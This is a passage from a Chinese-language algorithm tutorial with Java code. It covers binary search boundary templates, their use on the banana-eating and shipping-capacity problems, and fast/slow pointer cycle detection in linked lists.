class="hljs-keyword">int</span> mid = (left + right) / <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">if</span> (nums[mid] == target) &#123;<br>            left = mid + <span class="hljs-number">1</span>; <span class="hljs-comment">// 注意</span><br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (nums[mid] &lt; target) &#123;<br>            left = mid + <span class="hljs-number">1</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (nums[mid] &gt; target) &#123;<br>            right = mid;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> left - <span class="hljs-number">1</span>; <span class="hljs-comment">// 注意</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>1、为什么这个算法能够找到右侧边界</strong>？</p><p>答：类似地，关键点还是这里：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (nums[mid] == target) &#123;<br>    left = mid + <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>当 <code>nums[mid] == target</code> 时，不要立即返回，而是增大「搜索区间」的下界 <code>left</code>，使得区间不断向右收缩，达到锁定右侧边界的目的。</p><p><strong>2、为什么最后返回</strong> <strong><code>left - 1</code></strong> <strong>而不像左侧边界的函数，返回</strong> <strong><code>left</code></strong>？而且我觉得这里既然是搜索右侧边界，应该返回 <strong><code>right</code></strong> <strong>才对</strong>。</p><p>答：首先，while 循环的终止条件是 <code>left == right</code>，所以 <code>left</code> 和 <code>right</code> 是一样的，你非要体现右侧的特点，返回 <code>right - 1</code> 好了。</p><p>至于为什么要减一，这是搜索右侧边界的一个特殊点，关键在这个条件判断：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (nums[mid] == target) &#123;<br>    left = mid + <span class="hljs-number">1</span>;<br>    <span class="hljs-comment">// 这样想: mid = left - 1</span><br></code></pre></td></tr></table></figure><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/二分右边界.jpg" alt="img" style="zoom:50%;" /></p><p>因为我们对 <code>left</code> 的更新必须是 <code>left = mid + 1</code>，就是说 while 循环结束时，<code>nums[left]</code> 一定不等于 <code>target</code> 了，而 <code>nums[left-1]</code> 可能是 <code>target</code>。</p><p>至于为什么 <code>left</code> 的更新必须是 <code>left = mid + 1</code>，同左侧边界搜索，就不再赘述。</p><p><strong>3、为什么没有返回 -1 的操作？如果</strong> <strong><code>nums</code></strong> <strong>中不存在</strong> <strong><code>target</code></strong> <strong>这个值，怎么办</strong>？</p><p>答：类似之前的左侧边界搜索，因为 while 的终止条件是 <code>left == right</code>，就是说 <code>left</code> 的取值范围是 <code>[0, nums.length]</code>，所以可以添加两行代码，正确地返回 -1：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">while</span> (left &lt; right) &#123;<br>    <span class="hljs-comment">// ...</span><br>&#125;<br><span class="hljs-keyword">if</span> (left == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;<br><span class="hljs-keyword">return</span> nums[left-<span class="hljs-number">1</span>] == target ? (left-<span class="hljs-number">1</span>) : -<span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p><strong>4、是否也可以把这个算法的「搜索区间」也统一成两端都闭的形式呢？这样这三个写法就完全统一了，以后就可以闭着眼睛写出来了</strong>。</p><p>答：当然可以，类似搜索左侧边界的统一写法，其实只要改两个地方就行了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">right_bound</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> target)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> left = <span class="hljs-number">0</span>, right = nums.length - <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (left &lt;= right) &#123;<br>        <span class="hljs-keyword">int</span> mid = left + (right - left) / <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">if</span> (nums[mid] &lt; target) &#123;<br>            left = mid + <span class="hljs-number">1</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (nums[mid] &gt; target) &#123;<br>            right = mid - <span class="hljs-number">1</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (nums[mid] == target) &#123;<br>            <span class="hljs-comment">// 这里改成收缩左侧边界即可</span><br>            left = mid + <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// 这里改为检查 right 越界的情况，见下图</span><br>    <span class="hljs-keyword">if</span> (right &lt; <span class="hljs-number">0</span> || nums[right] != target)<br>        <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> right;<br>&#125;<br></code></pre></td></tr></table></figure><p>当 <code>target</code> 比所有元素都小时，<code>right</code> 会被减到 -1，所以需要在最后防止越界：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/二分右边界2.jpg" alt="img" style="zoom:50%;" /></p><p>至此，搜索右侧边界的二分查找的两种写法也完成了，其实将「搜索区间」统一成两端都闭反而更容易记忆，你说是吧？</p><h3 id="1-1-5-逻辑统一"><a href="#1-1-5-逻辑统一" class="headerlink" title="1.1.5 逻辑统一"></a>1.1.5 逻辑统一</h3><p>来梳理一下这些细节差异的因果逻辑：</p><p><strong>第一个，最基本的二分查找算法</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">因为我们初始化 right = nums.length - <span class="hljs-number">1</span><br>所以决定了我们的「搜索区间」是 [left, right]<br>所以决定了 <span class="hljs-keyword">while</span> (left &lt;= right)<br>同时也决定了 left = mid+<span class="hljs-number">1</span> 和 right = mid-<span class="hljs-number">1</span><br>因为我们只需找到一个 target 的索引即可<br>所以当 nums[mid] == target 时可以立即返回<br></code></pre></td></tr></table></figure><p><strong>第二个，寻找左侧边界的二分查找</strong>：</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs excel">因为我们初始化 <span class="hljs-built_in">right</span> = nums.length<br>所以决定了我们的「搜索区间」是 [<span class="hljs-built_in">left</span>, <span class="hljs-built_in">right</span>)<br>所以决定了 while (<span class="hljs-built_in">left</span> &lt; <span class="hljs-built_in">right</span>)<br>同时也决定了 <span class="hljs-built_in">left</span> = <span class="hljs-built_in">mid</span> + <span class="hljs-number">1</span> 和 <span class="hljs-built_in">right</span> = <span class="hljs-built_in">mid</span><br>因为我们需找到 target 的最左侧索引<br>所以当 nums[<span class="hljs-built_in">mid</span>] == target 时不要立即返回而要收紧右侧边界以锁定左侧边界<br></code></pre></td></tr></table></figure><p><strong>第三个，寻找右侧边界的二分查找</strong>：</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs excel">因为我们初始化 <span class="hljs-built_in">right</span> = nums.length<br>所以决定了我们的「搜索区间」是 [<span class="hljs-built_in">left</span>, <span class="hljs-built_in">right</span>)<br>所以决定了 while (<span class="hljs-built_in">left</span> &lt; <span class="hljs-built_in">right</span>)<br>同时也决定了 <span class="hljs-built_in">left</span> = <span class="hljs-built_in">mid</span> + <span class="hljs-number">1</span> 和 <span class="hljs-built_in">right</span> = <span class="hljs-built_in">mid</span><br>因为我们需找到 target 的最右侧索引<br>所以当 nums[<span class="hljs-built_in">mid</span>] == target 时不要立即返回而要收紧左侧边界以锁定右侧边界<br>又因为收紧左侧边界时必须 <span class="hljs-built_in">left</span> = <span class="hljs-built_in">mid</span> + <span class="hljs-number">1</span><br>所以最后无论返回 <span class="hljs-built_in">left</span> 还是 <span class="hljs-built_in">right</span>，必须减一<br></code></pre></td></tr></table></figure><p>对于寻找左右边界的二分搜索，常见的手法是使用左闭右开的「搜索区间」，<strong>我们还根据逻辑将「搜索区间」全都统一成了两端都闭，便于记忆，只要修改两处即可变化出三种写法</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">binary_search</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> target)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> left = <span class="hljs-number">0</span>, right = nums.length - <span class="hljs-number">1</span>; <br>    <span class="hljs-keyword">while</span>(left &lt;= right) &#123;<br>        <span class="hljs-keyword">int</span> mid = left + (right - left) / <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">if</span> (nums[mid] &lt; target) &#123;<br>            left = mid + <span class="hljs-number">1</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (nums[mid] &gt; target) &#123;<br>            right = mid - <span class="hljs-number">1</span>; <br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(nums[mid] == target) &#123;<br>            <span class="hljs-comment">// 直接返回</span><br>            <span class="hljs-keyword">return</span> mid;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// 直接返回</span><br>    <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">left_bound</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> target)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> left = <span class="hljs-number">0</span>, right = nums.length - <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (left &lt;= right) &#123;<br>        <span class="hljs-keyword">int</span> mid = left + (right - left) / <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">if</span> (nums[mid] &lt; target) &#123;<br>            left = mid + <span class="hljs-number">1</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (nums[mid] &gt; target) &#123;<br>            right = mid - <span class="hljs-number">1</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (nums[mid] == target) &#123;<br>            <span class="hljs-comment">// 别返回，锁定左侧边界</span><br>            right = mid - <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// 最后要检查 left 越界的情况</span><br>    <span class="hljs-keyword">if</span> (left &gt;= nums.length || nums[left] != target)<br>        <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> left;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">right_bound</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> target)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> left = <span class="hljs-number">0</span>, right = nums.length - <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (left &lt;= right) &#123;<br>        <span class="hljs-keyword">int</span> mid = left + (right - left) / <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">if</span> (nums[mid] &lt; target) &#123;<br>            left = mid + <span class="hljs-number">1</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (nums[mid] &gt; target) &#123;<br>            right = mid - <span class="hljs-number">1</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (nums[mid] == target) &#123;<br>            <span class="hljs-comment">// 别返回，锁定右侧边界</span><br>            left = mid + <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// 最后要检查 right 越界的情况</span><br>    <span class="hljs-keyword">if</span> (right &lt; <span class="hljs-number">0</span> || nums[right] != target)<br>        <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> right;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果以上内容你都能理解，那么恭喜你，二分查找算法的细节不过如此。</p><p>通过本文，你学会了：</p><p>1、分析二分查找代码时，不要出现 else，全部展开成 else if 方便理解。</p><p>2、注意「搜索区间」和 while 的终止条件，如果存在漏掉的元素，记得在最后检查。</p><p>3、如需定义左闭右开的「搜索区间」搜索左右边界，只要在 <code>nums[mid] == target</code> 时做修改即可，搜索右侧时需要减一。</p><p>4、如果将「搜索区间」全都统一成两端都闭，好记，只要稍改 <code>nums[mid] == target</code> 条件处的代码和返回的逻辑即可，<strong>推荐拿小本本记下，作为二分搜索模板</strong>。</p><h2 id="1-2-运用二分查找"><a href="#1-2-运用二分查找" class="headerlink" title="1.2 运用二分查找"></a>1.2 运用二分查找</h2><p>最常见的就是教科书上的例子，在<strong>有序数组</strong>中搜索给定的某个目标值的索引。再推广一点，如果目标值存在重复，修改版的二分查找可以返回目标值的左侧边界索引或者右侧边界索引。</p><p>PS：以上提到的三种二分查找算法形式在前文「二分查找详解」有代码详解，如果没看过强烈建议看看。</p><p>抛开有序数组这个枯燥的数据结构，二分查找如何运用到实际的算法问题中呢？当搜索空间有序的时候，就可以通过二分搜索「剪枝」，大幅提升效率。</p><p>说起来玄乎得很，本文先用一个具体的「爱吃香蕉的珂珂」的问题来举个例子。</p><h3 id="1-2-1-问题分析"><a href="#1-2-1-问题分析" class="headerlink" title="1.2.1 问题分析"></a>1.2.1 问题分析</h3><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/爱吃香蕉的珂珂.jpg" alt="img" style="zoom: 67%;" /></p><p>也就是说，珂珂 每小时最多吃一堆香蕉，如果吃不下的话留到下一小时再吃；如果吃完了这一堆还有胃口，也只会等到下一小时才会吃下一堆。在这个条件下，让我们确定 珂珂 吃香蕉的<strong>最小速度</strong>（根/小时）。</p><p>如果直接给你这个情景，你能想到哪里能用到二分查找算法吗？如果没有见过类似的问题，恐怕是很难把这个问题和二分查找联系起来的。</p><p>那么我们先抛开二分查找技巧，想想如何暴力解决这个问题呢？</p><p>首先，算法要求的是「<code>H</code> 小时内吃完香蕉的最小速度」，我们不妨称为 <code>speed</code>，请问 <code>speed</code> 最大可能为多少，最少可能为多少呢？</p><p>显然最少为 1，最大为 <code>max(piles)</code>，因为一小时最多只能吃一堆香蕉。那么暴力解法就很简单了，只要从 1 开始穷举到 <code>max(piles)</code>，一旦发现发现某个值可以在 <code>H</code> 小时内吃完所有香蕉，这个值就是最小速度：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">minEatingSpeed</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] piles, <span class="hljs-keyword">int</span> H)</span> </span>&#123;<br>    <span class="hljs-comment">// piles 数组的最大值</span><br>    <span class="hljs-keyword">int</span> max = getMax(piles);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> speed = <span class="hljs-number">1</span>; speed &lt; max; speed++) &#123;<br>        <span class="hljs-comment">// 以 speed 是否能在 H 小时内吃完香蕉</span><br>        <span class="hljs-keyword">if</span> (canFinish(piles, speed, H))<br>            <span class="hljs-keyword">return</span> speed;<br>    &#125;<br>    <span class="hljs-keyword">return</span> max;<br>&#125;<br></code></pre></td></tr></table></figure><p>注意这个 for 循环，就是在<strong>连续的空间线性搜索，这就是二分查找可以发挥作用的标志</strong>。由于我们要求的是最小速度，所以可以用一个<strong>搜索左侧边界的二分查找</strong>来代替线性搜索，提升效率：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">minEatingSpeed</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] piles, <span class="hljs-keyword">int</span> H)</span> </span>&#123;<br>    <span class="hljs-comment">// 套用搜索左侧边界的算法框架</span><br><span class="hljs-comment">// 获取max要走一个循环，不妨直接设为最大值，int left = 1, right = getMax(piles) + 1;</span><br>    <span class="hljs-keyword">int</span> left = <span class="hljs-number">1</span>, right = <span class="hljs-number">1000000000</span>;<br>    <span class="hljs-keyword">while</span> (left &lt; right) &#123;<br>        <span class="hljs-comment">// 防止溢出</span><br>        <span class="hljs-keyword">int</span> mid = left + (right - left) / <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">if</span> (canFinish(piles, mid, H)) &#123;<br>            right = mid;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            left = mid + <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> left;<br>&#125;<br></code></pre></td></tr></table></figure><p>PS：如果对于这个二分查找算法的细节问题有疑问，建议看下前文「二分查找详解」搜索左侧边界的算法模板，这里不展开了。</p><p>剩下的辅助函数也很简单，可以一步步拆解实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 时间复杂度 O(N)</span><br><span class="hljs-function"><span class="hljs-keyword">boolean</span> <span class="hljs-title">canFinish</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] piles, <span class="hljs-keyword">int</span> speed, <span class="hljs-keyword">int</span> H)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> time = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> n : piles) &#123;<br>        time += timeOf(n, speed);<br>    &#125;<br>    <span class="hljs-keyword">return</span> time &lt;= H;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">timeOf</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n, <span class="hljs-keyword">int</span> speed)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> (n / speed) + ((n % speed &gt; <span class="hljs-number">0</span>) ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">getMax</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] piles)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> max = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> n : piles)<br>        max = Math.max(n, max);<br>    <span class="hljs-keyword">return</span> max;<br>&#125;<br></code></pre></td></tr></table></figure><p>至此，借助二分查找技巧，算法的时间复杂度为 O(NlogN)。</p><h3 id="1-2-3-扩展延伸"><a href="#1-2-3-扩展延伸" class="headerlink" title="1.2.3 扩展延伸"></a>1.2.3 扩展延伸</h3><p>类似的，再看一道运输问题：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/在D天内送达包裹的能力.jpg" alt="img" style="zoom: 67%;" /></p><p>要在 <code>D</code> 天内运输完所有货物，货物不可分割，如何确定运输的最小载重呢（下文称为 <code>cap</code>）？</p><p>其实本质上和 珂珂 吃香蕉的问题一样的，首先确定 <code>cap</code> 的最小值和最大值分别为 <code>max(weights)</code> 和 <code>sum(weights)</code>。</p><p>我们要求<strong>最小载重</strong>，所以可以用搜索左侧边界的二分查找算法优化线性搜索：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 寻找左侧边界的二分查找</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">shipWithinDays</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] weights, <span class="hljs-keyword">int</span> D)</span> </span>&#123;<br>    <span class="hljs-comment">// 载重可能的最小值</span><br>    <span class="hljs-keyword">int</span> left = getMax(weights);<br>    <span class="hljs-comment">// 载重可能的最大值 + 1</span><br>    <span class="hljs-keyword">int</span> right = getSum(weights) + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (left &lt; right) &#123;<br>        <span class="hljs-keyword">int</span> mid = left + (right - left) / <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">if</span> (canFinish(weights, D, mid)) &#123;<br>            right = mid;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            left = mid + <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> left;<br>&#125;<br><br><span class="hljs-comment">// 如果载重为 cap，是否能在 D 天内运完货物？</span><br><span class="hljs-function"><span class="hljs-keyword">boolean</span> <span class="hljs-title">canFinish</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] w, <span class="hljs-keyword">int</span> D, <span class="hljs-keyword">int</span> cap)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> day = <span class="hljs-number">0</span>; day &lt; D; day++) &#123;<br>        <span class="hljs-keyword">int</span> maxCap = cap;<br>        <span class="hljs-keyword">while</span> ((maxCap -= w[i]) &gt;= <span class="hljs-number">0</span>) &#123;<br>            i++;<br>            <span class="hljs-keyword">if</span> (i == w.length)<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>通过这两个例子，你是否明白了二分查找在实际问题中的应用？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>    <span class="hljs-keyword">if</span> (isOK(i))<br>        <span class="hljs-keyword">return</span> ans;<br></code></pre></td></tr></table></figure><h1 id="2-运用双指针"><a href="#2-运用双指针" class="headerlink" title="2. 运用双指针"></a>2. 运用双指针</h1><p>我把双指针技巧再分为两类，一类是「快慢指针」，一类是「左右指针」。前者解决主要解决链表中的问题，比如典型的判定链表中是否包含环；后者主要解决数组（或者字符串）中的问题，比如二分查找。</p><h2 id="2-1-快慢指针的常见算法"><a href="#2-1-快慢指针的常见算法" class="headerlink" title="2.1 快慢指针的常见算法"></a>2.1 快慢指针的常见算法</h2><p>快慢指针一般都初始化指向链表的头结点 <code>head</code>，前进时快指针 <code>fast</code> 在前，慢指针 <code>slow</code> 在后，巧妙解决一些链表中的问题。</p><p><strong>1、判定链表中是否含有环</strong></p><p>这属于链表最基本的操作了，学习数据结构应该对这个算法思想都不陌生。</p><p>单链表的特点是每个节点只知道下一个节点，所以一个指针的话无法判断链表中是否含有环的。</p><p>如果链表中不含环，那么这个指针最终会遇到空指针 <code>null</code> 表示链表到头了，这还好说，可以判断该链表不含环：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">boolean</span> <span class="hljs-title">hasCycle</span><span class="hljs-params">(ListNode head)</span> </span>&#123;<br>    <span class="hljs-keyword">while</span> (head != <span class="hljs-keyword">null</span>)<br>        head = head.next;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>但是如果链表中含有环，那么这个指针就会陷入死循环，因为环形数组中没有 <code>null</code> 指针作为尾部节点。</p><p>经典解法就是用两个指针，一个跑得快，一个跑得慢。如果不含有环，跑得快的那个指针最终会遇到 <code>null</code>，说明链表不含环；如果含有环，快指针最终会超慢指针一圈，和慢指针相遇，说明链表含有环。</p><p>力扣第 141 题就是这个问题，解法代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">boolean</span> <span class="hljs-title">hasCycle</span><span class="hljs-params">(ListNode head)</span> </span>&#123;<br>    ListNode fast, slow;<br>    fast = slow = head;<br>    <span class="hljs-keyword">while</span> (fast != <span class="hljs-keyword">null</span> &amp;&amp; fast.next != <span class="hljs-keyword">null</span>) &#123;<br>        fast = fast.next.next;<br>        slow = slow.next;<br><br>        <span class="hljs-keyword">if</span> (fast == slow) <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>2、已知链表中含有环，返回这个环的起始位置</strong></p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/快慢指针.jpg" style="zoom:50%;" /></p><p>这是力扣第 142 题，其实一点都不困难，有点类似脑筋急转弯，先直接看代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function">ListNode <span class="hljs-title">detectCycle</span><span class="hljs-params">(ListNode head)</span> </span>&#123;<br>    ListNode fast, slow;<br>    fast = slow = head;<br>    <span class="hljs-keyword">while</span> (fast != <span class="hljs-keyword">null</span> &amp;&amp; fast.next != <span class="hljs-keyword">null</span>) &#123;<br>        fast = fast.next.next;<br>        slow = slow.next;<br>        <span 